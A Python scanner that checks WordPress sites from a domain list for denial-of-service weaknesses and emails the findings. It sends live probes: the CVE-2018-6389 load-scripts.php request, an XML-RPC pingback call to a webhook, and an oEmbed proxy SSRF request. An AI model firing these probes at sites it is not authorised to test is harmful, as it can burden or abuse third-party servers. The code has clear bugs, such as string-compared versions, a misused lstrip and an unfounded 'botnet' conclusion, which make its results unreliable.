### ---------------------
#? Patrick Kuin
#? Wordpress DOS/DDOS scanner
#? This code only covers the basic DOS/DDOS attack in the wordpress CMS itself and doesn't check any plugins
### ---------------------
from fancy_script import banner, print_finding
import argparse
import requests
import subprocess
import xml.etree.ElementTree as ET
import smtplib
from email.mime.text import MIMEText
import json
import time
#? Write a function which is able to send an email to a specific email address with the data of the scan


def collect_wordpress_info(domain: str) -> str:
    print_finding("Debug", f"Scanning {domain}", "info", "Scanning", "Wordpress")
    
    # Check if we can identify if the website is running wordpress by inspecting the source code
    # on specific keywords
    wordpress_found = False
    response = requests.get(domain)
    for wp_string in ['wp-content', 'Wp-Content', 'WordPress', 'wordpress']:
        if wp_string in response.text:
            print_finding("info", "The website seems to be running wordpress", "low", "Scanning", "Wordpress", confidence="99")
            wordpress_found = True
            break
    
    # Second check see if the /wp-login.php endpoint is reachable
    if not wordpress_found:
        wp_admin = domain + "/wp-login.php"
        response = requests.get(wp_admin)
        if response.status_code == 200: 
            response = requests.get(domain)
            wordpress_found = True
            print_finding("info", "The website seems to be running wordpress", "low", "Scanning", "Wordpress", confidence="99")
    
    if not wordpress_found:
        print_finding("Error", "The website doesn't seems to be running wordpress", "info", "Scanning", "Wordpress")
        exit()
    
    # Try to get the wordpress version
    version_found = False
    response = requests.get(f"{domain}/feed")
    if response.status_code == 200:
        if "?v=" in response.text:
            xml_data = response.text
            root = ET.fromstring(xml_data)
            # Find the generator element
            generator = root.find('.//generator')
            # Extract the version number
            version_number = generator.text.split("?v=")[-1]
            print_finding("info", f"Wordpress version: {version_number}", "low", "Scanning", "Wordpress", confidence="99")
            wordpress_found = True
    if not version_found:
        response = requests.get(f"{domain}")
        if '<meta name="generator" content=' in response.text:
            #print(response.text)
            # Search inside the response.text for the generator meta tag
            generator_tag = response.text.split('<meta name="generator" content=')[-1]
            wordpress_version = generator_tag[:20].lstrip('"')
            # The output of wordpress_version needs to be 4.9.7 so we need to strip the rest of the string and remove the " at the end
            wordpress_version = wordpress_version.split('"')[0]
            wordpress_version = wordpress_version.split()[1]
            print_finding("info", f"Wordpress version: {wordpress_version}", "low", "Scanning", "Wordpress", confidence="99")
            wordpress_found = True
    if wordpress_found:
        return wordpress_version
    else:
        return "Not found"
    # TODO: Add username enumeration check

# Send findings for each domain to the an email address and create a report
def send_email(subject: str, body: str):
    
    # parse data from the mailconfig.json file into the correct variables
    with open("./mailconfig.json", 'r') as file:
        mailconfig = json.load(file)
    
    print_finding("Debug", f"Sending report to : {mailconfig['receiver']}", "info", "Data processing", "Wordpress")
    
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = mailconfig['sender']
    msg['To'] = mailconfig['receiver']
    
    server = smtplib.SMTP(mailconfig['smtp_server'], mailconfig['smtp_port'])
    server.starttls()
    server.login(mailconfig['sender'], mailconfig['password'])
    server.send_message(msg)
    server.quit()

def send_findings_to_email(all_findings: dict):
    # Format the alldata into a nice report where the findings are grouped per domain and the wordpress version is also included
    # and if the findings are empty, than set the value no findings like this Finding: No findings. Inside the data field there can be multiple vulnebilties sort them nicely out 
    # and display them on a correct way so we can read them easily, which vulnerability, what is the severity, what is the confidence and what is the solution
    vuln_counter = 0
    findings_str = ""
    findings_str += "Report of the wordpress Dos/DDos scan\n"
    findings_str += "--------------------------\n"
    for domain, findings in all_findings.items():
        findings_str += f"Domain: {domain}\n"
        findings_str += f"Wordpress version: {findings['wordpress_version']}\n\n"
        findings_str += "Findings:\n"
        findings_str += "--------------------------\n"
        if findings['wordpress_findings']['vulnerability'] == "":
            findings_str += "No findings\n"
        else:
            # Split the findings on the new line and loop over them
            
            for vulnerability, severity, confidence, solution in zip(findings['wordpress_findings']['vulnerability'].split('\n'), findings['wordpress_findings']['severity'].split('\n'), findings['wordpress_findings']['confidence'].split('\n'), findings['wordpress_findings']['solution'].split('\n')):
                if vulnerability != "":
                    findings_str += f"Vulnerability: {vulnerability}\n"
                    findings_str += f"Severity: {severity}\n"
                    findings_str += f"Confidence: {confidence}\n"
                    findings_str += f"Solution: {solution}\n"
                    findings_str += "--------------------------\n"
                    vuln_counter += 1
        findings_str += "\n"
    if vuln_counter > 1:
        findings_str += f"Total vulnerabilities found: {vuln_counter}, which indicates a botnet"
    
    #print(findings_str)

    # Send the email
    timestr = time.strftime("%Y%m%d-%H%M%S")
    send_email(
        subject=f'Scan Findings - Wordpress Dos/DDos scan at {timestr}',
        body=findings_str
    )

def scan_domain(domain: str, webhook_url: str, all_data: dict) -> dict:
    def add_finding(vulnerability: str, severity: str, confidence: str, solution: str) -> None:
        # appende the data to the domain_findings dict and there can be multiple findings per domain, so we dont want to overwrite the data but append in a list
        domain_findings[f"{domain}"]['wordpress_findings']['vulnerability'] += f"\n{vulnerability}"
        domain_findings[f"{domain}"]['wordpress_findings']['severity'] += f"\n{severity}"
        domain_findings[f"{domain}"]['wordpress_findings']['confidence'] += f"\n{confidence}"
        domain_findings[f"{domain}"]['wordpress_findings']['solution'] += f"\n{solution}"
        
        
        
        
        


                



        
    
    wordpress_version = collect_wordpress_info(domain)
    print_finding("Debug", "Starting DDOS/DOS detection", "info", "Scanning", "Wordpress")
    
    domain_findings = {
        f"{domain}": {
            "wordpress_findings": {
                "vulnerability": "",
                "severity": "",
                "confidence": "",
                "solution": ""
            },
            "wordpress_version": wordpress_version          
        }
    }
     

    #? DDOS CVEs checks depending on wordpress Core version
    if wordpress_version != "":
        if wordpress_version <= "4.9.8":
            # Test for CVE-2018-6389
            p1 = """
                eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
                """
            url = f"{domain}/wp-admin/load-scripts.php?c=1&load%5B%5D={p1}"
            response = requests.get(url)
            if response.status_code == 200:
                # Store the data into the add_finding function
                add_finding("CVE-2018-6389", "high", "70", "Update wordpress to the latest version")
                print_finding("info", f"Vulnerable to CVE-2018-6389", "high", "Scanning", "Wordpress", confidence="70")

    #? 4. Check if XMLRPC is enabled
    xmlrpc_url = f"{domain}/xmlrpc.php"
    response = requests.get(xmlrpc_url)
    # Check if the webpage gives the status code 405 method not allowed, because it wants a POST request
    if response.status_code == 405:
        #TODO: If XMLRPC is on --> vulns checks for the wordpress
        #? 1. check XMLRPC pingback attack
        xml_data = f"""
        <methodCall>
            <methodName>pingback.ping</methodName>
            <params><param>
            <value><string>{webhook_url}</string></value>
            </param><param><value><string>{domain}/?p=0</string>
            </value></param></params>
        </methodCall>
        """
        headers = {'Content-Type': 'application/xml'}
        response = requests.post(xmlrpc_url, data=xml_data, headers=headers)
        if response.status_code == 200:
            # Store the data into the domain_findings data and also append the severity level which is high in this case
            add_finding("XMLRPC pingback, check webhook for request", "medium", "50", "Disable XMLRPC pingback, see: https://wordpress.org/plugins/remove-xmlrpc-pingback-ping/")
            print_finding("info", f"XMLRPC pingback, check webhook for request", "medium", "Scanning", "Wordpress", confidence="50")
    
    #? 2. Check against /wp-json/oembed/1.0/proxy - SSRF (/wp-json/oembed/1.0/proxy?url=target.site)
    webhook_stripped = webhook_url.lstrip("https://")
    response = requests.get(f"{domain}/wp-json/oembed/1.0/proxy?url={webhook_stripped}")
    if response.status_code == 200:
        # store the dat into the add_finding function
        add_finding("/wp-json/oembed/1.0/proxy - SSRF/Dos", "high", "75", "disble the REST API, see: https://secure.wphackedhelp.com/blog/wordpress-rest-api-vulnerability-content-injection/")
        print_finding("info", f"SSRF and DOS vulebrability found in /wp-json/oembed/1.0/proxy?url=", "high", "Scanning", "Wordpress", confidence="75")

    print_finding("debug", "Scanning complete", "info", "Scanning", "Completed")
    all_data.update(domain_findings)
    return all_data

# The main function of the program
# Parse the domains from the domainlist.txt
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Wordpress Dos/DDos scanner")
    parser.add_argument("--domains", required=True, type=str, help="The file containing the domains to scan, must be in the same directory as the script")
    parser.add_argument("--webhook", required=True, type=str, help="Your webhook.site url, like: https://webhook.site/a2b687cb-244d-4d9c-b7ed-109033a929b1")
    
    args = parser.parse_args()
    
    # Read the file and store the domains in a list
    with open(f"./{args.domains}", 'r') as file:
        domains = [domain.strip('\n') for domain in file.readlines()]
    
    print_finding("debug", "Initializing...", "info", "Parsing", "Domain names")
    
    # Check if the domain is not empty before initiating the scan
    all_findings = {}
    for domain in domains:
        if domain:
            scan_domain(domain, args.webhook, all_findings)
    send_findings_to_email(all_findings)
    

    
